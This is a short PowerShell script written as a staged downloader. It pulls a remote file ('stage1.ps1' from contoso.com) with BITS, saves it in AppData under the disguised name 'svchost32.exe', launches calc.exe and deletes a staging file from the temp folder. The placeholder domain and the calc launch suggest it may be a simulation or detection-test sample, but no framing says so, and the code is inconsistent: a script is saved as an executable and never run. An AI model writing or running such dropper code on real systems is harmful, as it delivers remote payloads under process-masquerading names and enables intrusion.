
[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://contoso.com/stage1.ps1",
    [string]$WorkingPath = "$env:APPDATA\svchost32.exe",
    [int]$StageTimeout = 170
)
Start-BitsTransfer -Source $RemoteUrl -Destination $WorkingPath
Start-Process -FilePath "calc.exe"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
